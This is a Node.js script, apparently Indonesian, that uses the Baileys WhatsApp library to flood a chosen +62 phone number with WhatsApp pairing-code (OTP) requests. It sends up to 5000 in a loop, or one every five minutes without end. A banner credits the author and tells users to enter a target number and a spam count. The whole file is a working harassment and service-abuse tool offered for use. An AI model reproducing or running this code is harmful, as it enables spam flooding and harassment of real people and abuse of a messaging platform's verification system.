import makeWASocket, { useMultiFileAuthState, DisconnectReason } from "@whiskeysockets/baileys";
import pino from 'pino';
import readline from "readline";

const color = [
    '\x1b[31m',
    '\x1b[32m',
    '\x1b[33m',
    '\x1b[34m',
    '\x1b[35m',
    '\x1b[36m'
];
const wColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function KleeProject() {
    const { state, saveCreds } = await useMultiFileAuthState('./69/session');
    const KleeBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });
    try {
        const mode = await question(color + 'Pilih mode (1: Single spam, 2: 24 jam) : ' + xColor);

        if (mode === '2') {
            const phoneNumber = await question(color + 'Target : ' + xColor);
            let count = 0;

            KleeBotInc.ev.on('connection.update', ({ connection, lastDisconnect }) => {
                if (connection === 'close') {
                    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                    if (shouldReconnect) {
                        console.log(color + 'Koneksi putus, reconnect...' + xColor);
                        KleeProject();
                    }
                }
            });
            KleeBotInc.ev.on('creds.update', saveCreds);

            const sendPeriodic = async () => {
                try {
                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
                    count++;
                    console.log(color + `[${new Date().toLocaleString()}] OTP ${count} terkirim ke ${phoneNumber}` + xColor);
                } catch (error) {
                    console.error(`[${new Date().toLocaleString()}] Error: ${error.message}`);
                }
            };

            await sendPeriodic();
            setInterval(sendPeriodic, 300000);
        } else {
            const phoneNumber = await question(color + 'Target : ' + xColor);
            const KleeCodes = parseInt(await question(color + 'Total spam : ' + xColor));

            if (isNaN(KleeCodes) || KleeCodes <= 0) {
                console.log('example : 20.');
                return;
            }

            for (let i = 0; i < KleeCodes; i++) {
                try {
                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(color + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
                } catch (error) {
                    console.error('Error:', error.message);
                }
            }
        }
    } catch (error) {
        console.error('error');
    }

    return KleeBotInc;
}
console.log(color + `
=========================
Nama pembuat script[Rizky]
=========================
1•WhatsApp +6283850540570
2•Instagram Rizky.0_o
3•Nama saya Rizky
4•Bisalah gunakan ya bray✓
=========================
┏❐
┃ [FOLLOW THE INSTRUCTIONS BELOW TO SPAM]
┃
┃⭔ Target Number ( 62xxxxxxx )
┃⭔ how much spam ( 1-5000 )
┃
┃ [THIS TOOL CAN ONLY BE USED ON NUMBER +62]
┗❐
=========================` + xColor);

KleeProject();
